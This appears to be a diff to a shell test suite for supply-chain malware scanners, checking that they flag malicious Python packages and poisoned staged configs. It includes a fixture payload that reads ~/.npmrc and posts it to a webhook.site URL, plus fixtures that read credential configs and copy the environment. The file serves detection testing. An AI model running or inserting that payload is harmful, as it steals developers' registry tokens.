+expect_has  "--live outage named on stderr" "registry check unavailable" "$(cat "$SB/pa-live.err")"
+
+# PyPI code was found ONLY through top_level.txt, and a dist-info without one was
+# dropped with no message: a real venv printed "45 packages (45 scanned)" beside 93
+# dist-infos, so most wheels (protobuf's google/ namespace among them) passed as
+# clean unread. RECORD is the fallback; whatever still cannot be located is named.
+PAY='import os, urllib.request
+c = open(os.path.expanduser("~/.npmrc")).read()
+urllib.request.urlopen("https://webhook.site/abc", data=c.encode())'
+pa_dist() { # site-packages dist-name version -> creates <dist>-<ver>.dist-info with METADATA
+  mkdir -p "$1/$2-$3.dist-info"
+  printf 'Metadata-Version: 2.1\nName: %s\nVersion: %s\n' "$2" "$3" > "$1/$2-$3.dist-info/METADATA"
+}
+SP="$SB/pa-record/lib/site-packages"
+pa_dist "$SP" recpkg 1.0
+mkdir -p "$SP/recpkg"; printf '%s\n' "$PAY" > "$SP/recpkg/__init__.py"
+printf 'recpkg/__init__.py,,\nrecpkg-1.0.dist-info/METADATA,,\nrecpkg-1.0.dist-info/RECORD,,\n../../bin/recpkg,,\n' \
+  > "$SP/recpkg-1.0.dist-info/RECORD"
+out="$("$PYTHON" "$PA" --root "$SB/pa-record" --no-cache 2>/dev/null)"; rc=$?
+expect_exit "RECORD-only pypi package is scanned -> 10" 10 "$rc"
+expect_has  "RECORD-only package flagged" "pypi:recpkg@1.0" "$out"
+
+# A PEP 420 namespace (no __init__.py) shared by several dists: RECORD must lead to
+# this dist's own subpackage, the protobuf google/protobuf shape.
+SP="$SB/pa-ns/lib/site-packages"
+pa_dist "$SP" nsproto 4.0
+mkdir -p "$SP/nsroot/proto" "$SP/nsroot/other"
+printf '%s\n' "$PAY" > "$SP/nsroot/proto/__init__.py"
+printf 'x = 1\n' > "$SP/nsroot/other/__init__.py"
+printf 'nsroot/proto/__init__.py,,\nnsproto-4.0.dist-info/RECORD,,\n' > "$SP/nsproto-4.0.dist-info/RECORD"
+out="$("$PYTHON" "$PA" --root "$SB/pa-ns" --no-cache --json 2>/dev/null)"; rc=$?
+expect_exit "namespace package found via RECORD -> 10" 10 "$rc"
+expect_has  "namespace package flagged" '"name": "nsproto"' "$out"
+
+# top_level.txt naming a single-file module (six.py-style) was looked up as a dir only.
+SP="$SB/pa-mod/lib/site-packages"
+pa_dist "$SP" onefile 1.2
+printf 'onefile\n' > "$SP/onefile-1.2.dist-info/top_level.txt"
+printf '%s\n' "$PAY" > "$SP/onefile.py"
+out="$("$PYTHON" "$PA" --root "$SB/pa-mod" --no-cache 2>/dev/null)"; rc=$?
+expect_exit "single-file module from top_level.txt is scanned -> 10" 10 "$rc"
+expect_has  "single-file module flagged" "pypi:onefile@1.2" "$out"
+
+# No top_level.txt and no RECORD: nothing to scan, which is never clean.
+SP="$SB/pa-ghost/lib/site-packages"
+pa_dist "$SP" ghost 0.1
+"$PYTHON" "$PA" --root "$SB/pa-ghost" --no-cache >"$SB/pa-ghost.out" 2>"$SB/pa-ghost.err"
+expect_exit "unlocatable pypi package is not clean -> 5" 5 $?
+expect_has  "unlocatable package named on stderr" "ghost@0.1" "$(cat "$SB/pa-ghost.err")"
+expect_has  "stderr says NOT scanned" "NOT scanned" "$(cat "$SB/pa-ghost.err")"
+expect_lacks "no clean verdict beside an unscanned package" "clean:" "$(cat "$SB/pa-ghost.out")"
+out="$("$PYTHON" "$PA" --root "$SB/pa-ghost" --no-cache --json 2>/dev/null)"
+expect_has  "unscanned package in JSON meta" '"package": "ghost@0.1"' "$out"
+cp -R "$SB/pa-record/lib/site-packages/." "$SP/"
+"$PYTHON" "$PA" --root "$SB/pa-ghost" --no-cache >/dev/null 2>"$SB/pa-ghost.err"
+expect_exit "findings outrank an unscanned package -> 10" 10 $?
+expect_has  "unscanned still named beside findings" "ghost@0.1" "$(cat "$SB/pa-ghost.err")"
+
+# A loopback or unspecified raw IP is no exfil endpoint, yet the raw-IP alternative
+# took any dotted quad: mcp 1.30.0 went HIGH cred-exfil + env-exfil only because a
+# dev-server origin allow-list ("http://127.0.0.1:*") sat beside its own installer
+# writing claude_desktop_config and a subprocess env copy. A public raw IP must fire.
+pa_ipkg() { # root ip -> pypi package that reads a credential path, copies env, names <ip>
+  local sp="$1/lib/site-packages"; pa_dist "$sp" ippkg 1.0
+  printf 'ippkg\n' > "$sp/ippkg-1.0.dist-info/top_level.txt"; mkdir -p "$sp/ippkg"
+  printf 'import os\nCFG = os.path.expanduser("~/claude_desktop_config.json")\nENV = dict(os.environ.items())\nORIGINS = ["http://%s:*", "http://localhost:*"]\n' \
+    "$2" > "$sp/ippkg/__init__.py"
+}
+pa_ipkg "$SB/pa-loop" 127.0.0.1
+printf 'BIND = "http://0.0.0.0:8000"\nALT = "https://127.45.6.7/"\n' > "$SB/pa-loop/lib/site-packages/ippkg/server.py"
+out="$("$PYTHON" "$PA" --root "$SB/pa-loop" --no-cache 2>/dev/null)"; rc=$?
+expect_exit "loopback-only raw IP with credential read is not high -> 0" 0 "$rc"
+expect_lacks "loopback raw IP is no cred-exfil endpoint" "cred-exfil" "$out"
+expect_lacks "loopback raw IP is no env-exfil endpoint" "env-exfil" "$out"
+pa_ipkg "$SB/pa-pubip" 203.0.113.7
+out="$("$PYTHON" "$PA" --root "$SB/pa-pubip" --no-cache 2>/dev/null)"; rc=$?
+expect_exit "public raw IP with credential read still flagged -> 10" 10 "$rc"
+expect_has  "public raw IP is a cred-exfil endpoint" "cred-exfil" "$out"
+
 # ── config-drift-check.py (repo-integrity / config-as-code, layer 6) ───────
 echo "-- config-drift-check.py --"
 CD="$SCRIPTS/config-drift-check.py"
@@ -441,6 +815,60 @@ expect_has  "flags tasks autorun shell" "tasks-autorun-shell" "$out"
 out="$("$PYTHON" "$CD" --root "$SB/cd-evil" --json --findings-only 2>/dev/null)"
 expect_has  "json envelope schema" "config-drift-check/v1" "$out"
 
+# --staged took file NAMES from the index but read CONTENT from the working tree:
+# stage a poisoned config, put a clean copy back on disk, and the commit carried
+# the loader while the gate scanned the decoy. It must read the staged blob.
+if command -v git >/dev/null 2>&1; then
+  G="$SB/cd-git"; mkdir -p "$G/sub"
+  git -C "$G" init -q; git -C "$G" config core.autocrlf false
+  cp "$SB/cd-evil/tailwind.config.js" "$G/tailwind.config.js"
+  git -C "$G" add tailwind.config.js
+  printf 'module.exports = { content: [] }\n' > "$G/tailwind.config.js"
+  (cd "$G" && "$PYTHON" "$CD" --staged --findings-only >/dev/null 2>&1)
+  expect_exit "--staged scans the staged blob, not the clean working copy -> 10" 10 $?
+  (cd "$G/sub" && "$PYTHON" "$CD" --staged --findings-only >/dev/null 2>&1)
+  expect_exit "--staged from a subdirectory still finds it -> 10" 10 $?
+  rm "$G/tailwind.config.js"
+  (cd "$G" && "$PYTHON" "$CD" --staged --findings-only >/dev/null 2>&1)
+  expect_exit "--staged scans a staged config deleted from disk -> 10" 10 $?
+  # The inverse: a clean staged blob passes even when the working copy is poisoned,
+  # proving --staged reads the index and nothing else.
+  G2="$SB/cd-git2"; mkdir -p "$G2"
+  git -C "$G2" init -q; git -C "$G2" config core.autocrlf false
+  printf 'module.exports = { content: [] }\n' > "$G2/tailwind.config.js"
+  git -C "$G2" add tailwind.config.js
+  cp "$SB/cd-evil/tailwind.config.js" "$G2/tailwind.config.js"
+  (cd "$G2" && "$PYTHON" "$CD" --staged --findings-only >/dev/null 2>&1)
+  expect_exit "--staged passes a clean index beside a poisoned working copy -> 0" 0 $?
+else
+  echo "  SKIP  --staged index-content checks (git not on PATH)"
+fi
+
+# A config that could not be read came back as "" (no findings) and counted as
+# scanned, so the run ended clean. Unreadable is made with chmod where the
+# filesystem honours it, else an ACL deny (Git Bash on NTFS ignores mode bits;
+# MSYS_NO_PATHCONV stops Git Bash rewriting icacls' /deny into a path).
+CDU="$SB/cd-unread"; mkdir -p "$CDU"
+printf 'module.exports = {}\n' > "$CDU/vite.config.js"; chmod 000 "$CDU/vite.config.js"
+CDU_ACL=""
+if cat "$CDU/vite.config.js" >/dev/null 2>&1 && command -v icacls >/dev/null 2>&1 && command -v cygpath >/dev/null 2>&1; then
+  CDU_ACL="$(cygpath -w "$CDU/vite.config.js")"
+  MSYS_NO_PATHCONV=1 icacls "$CDU_ACL" /deny "${USERNAME:-$USER}:(R)" >/dev/null 2>&1
+fi
+if cat "$CDU/vite.config.js" >/dev/null 2>&1; then
+  echo "  SKIP  unreadable-config case (could not make a file unreadable here)"
+else
+  out="$("$PYTHON" "$CD" --root "$CDU" 2>&1)"; rc=$?
+  expect_exit "unreadable config is not clean -> 5" 5 "$rc"
+  expect_has  "unreadable config is named" "vite.config.js" "$out"
+  expect_lacks "no clean verdict beside an unreadable config" "clean: no config-drift" "$out"
+  cp "$SB/cd-evil/tailwind.config.js" "$CDU/tailwind.config.js"
+  "$PYTHON" "$CD" --root "$CDU" --findings-only >/dev/null 2>&1
+  expect_exit "findings outrank an unreadable config -> 10" 10 $?
+fi
+[[ -n "$CDU_ACL" ]] && MSYS_NO_PATHCONV=1 icacls "$CDU_ACL" /remove:d "${USERNAME:-$USER}" >/dev/null 2>&1
+chmod 644 "$CDU/vite.config.js"
+
 # ── terminal design system (term.sh adoption + ASCII purity) ───────────────
 echo "-- terminal design system --"
 for s in integrity-audit preinstall-check scan-extensions; do
@@ -467,6 +895,70 @@ ascii_pure "postinstall"     "$PYTHON" "$SCRIPTS/postinstall-audit.py" --root "$
 # stdout data stays plain even under FORCE_COLOR (the pipeable contract).
 tdo="$(FORCE_COLOR=1 env HOME="$TDE" "$PYTHON" "$SCRIPTS/exposure-check.py" --root "$TDE" --no-extensions 2>/dev/null)"
 case "$tdo" in *$'\033'*) no "exposure-check stdout leaked ANSI";; *) ok "exposure-check stdout stays plain data";; esac
+
+# ── standalone: the skill folder copied ALONE (portable-pack contract) ─────
+# This folder is copied on its own into other plugins, with no sibling
+# skills/_lib, no repo hooks/, no ~/.claude layout. Copy just this skill to a
+# bare temp dir and prove every script still answers --help and runs offline.
+# The bash scripts must drop to their plain framing when _lib/term.sh is absent,
+# and that framing must be 7-bit ASCII with no TERM_ASCII to ask for it.
+echo "-- standalone (skill folder copied alone) --"
+mkdir -p "$SB/alone"; cp -R "$SKILL" "$SB/alone/"
+AS="$SB/alone/$(basename "$SKILL")/scripts"   # a pack may rename the folder
+[[ -e "$SB/alone/_lib" ]] && no "standalone copy has a sibling _lib (test is void)" || ok "standalone copy has no sibling _lib"
+plain_ascii() { # desc want-exit cmd...  (stderr must be 7-bit; stdout discarded)
+  local d="$1" want="$2" e rc; shift 2
+  e="$("$@" 2>&1 1>/dev/null)"; rc=$?
+  expect_exit "$d" "$want" "$rc"
+  if printf '%s' "$e" | LC_ALL=C grep -q '[^[:print:][:cntrl:]]'; then
+    no "$d: framing has non-ASCII without _lib"
+  else ok "$d: framing plain ASCII without _lib"; fi
+}
+AW="$SB/alone-proj"; mkdir -p "$AW/.github/workflows" "$SB/alone-zizmor" "$SB/alone-nonet" "$SB/alone-ext/pub.tool-1.0.0"
+printf 'on: push\njobs: { b: { runs-on: ubuntu-latest, steps: [ { run: "echo ok" } ] } }\n' > "$AW/.github/workflows/ci.yml"
+printf '{"publisher":"pub","name":"tool","version":"1.0.0"}' > "$SB/alone-ext/pub.tool-1.0.0/package.json"
+# Shims keep the run offline and deterministic: a silent "installed" zizmor (its
+# own output is not ours to police) and a curl whose every registry fetch fails.
+printf '#!/bin/sh\nexit 0\n' > "$SB/alone-zizmor/zizmor"
+printf '#!/bin/sh\nexit 6\n' > "$SB/alone-nonet/curl"
+chmod +x "$SB/alone-zizmor/zizmor" "$SB/alone-nonet/curl"
+for s in integrity-audit preinstall-check scan-extensions; do
+  bash "$AS/$s.sh" --help >/dev/null 2>&1; expect_exit "alone: $s.sh --help" 0 $?
+done
+for s in exposure-check config-drift-check postinstall-audit; do
+  bash "$AS/run-python.sh" "$AS/$s.py" --help >/dev/null 2>&1; expect_exit "alone: run-python.sh $s.py --help" 0 $?
+done
+for fc in "" 1; do   # FORCE_COLOR=1 is the branch that would open a term.sh panel
+  t="alone${fc:+ FORCE_COLOR}"
+  plain_ascii "$t: integrity-audit, workflows + zizmor" 0 \
+    env FORCE_COLOR="$fc" HOME="$TDE" APPDATA="$TDE" PATH="$SB/alone-zizmor:$PATH" bash "$AS/integrity-audit.sh" "$AW"
+  plain_ascii "$t: preinstall-check, registry down -> 7" 7 \
+    env FORCE_COLOR="$fc" PATH="$SB/alone-nonet:$PATH" bash "$AS/preinstall-check.sh" lodash@4.17.21
+  plain_ascii "$t: scan-extensions inventory" 0 \
+    env FORCE_COLOR="$fc" HOME="$TDE" SC_EXT_DIRS="$SB/alone-ext" bash "$AS/scan-extensions.sh"
+done
+if command -v zizmor >/dev/null 2>&1; then
+  echo "  SKIP  alone: integrity-audit zizmor-absent branch (zizmor installed here)"
+else
+  plain_ascii "alone: integrity-audit, workflows, no zizmor" 0 \
+    env HOME="$TDE" APPDATA="$TDE" bash "$AS/integrity-audit.sh" "$AW"
+fi
+# Offline modes, and the bundled catalog still resolves inside the copy.
+"$PYTHON" "$AS/exposure-check.py" --root "$SB/exposed" --no-extensions --findings-only >/dev/null 2>&1
+expect_exit "alone: exposure-check finds IOC via copied catalog -> 10" 10 $?
+"$PYTHON" "$AS/config-drift-check.py" --root "$SB/cd-clean" >/dev/null 2>&1
+expect_exit "alone: config-drift-check offline -> 0" 0 $?
+"$PYTHON" "$AS/postinstall-audit.py" --root "$SB/pa-clean" --no-cache >/dev/null 2>&1
+expect_exit "alone: postinstall-audit offline -> 0" 0 $?
+if command -v pwsh >/dev/null 2>&1 && [[ "$_PHM_WIN" == 1 ]]; then
+  APHM="$AS/phone-home-monitor.ps1"; ACLEAN="$SB/phm-clean.json"
+  command -v cygpath >/dev/null 2>&1 && { APHM="$(cygpath -w "$APHM")"; ACLEAN="$(cygpath -w "$ACLEAN")"; }
+  pwsh -NoProfile -File "$APHM" --help >/dev/null 2>&1; expect_exit "alone: phone-home-monitor --help" 0 $?
+  pwsh -NoProfile -File "$APHM" -InputJson "$ACLEAN" >/dev/null 2>&1
+  expect_exit "alone: phone-home-monitor clean replay -> 0" 0 $?
+else
+  echo "  SKIP  alone: phone-home-monitor.ps1 needs pwsh on Windows"
+fi
 
 # ── summary ────────────────────────────────────────────────────────────────
 echo "=== $PASS passed, $FAIL failed ==="
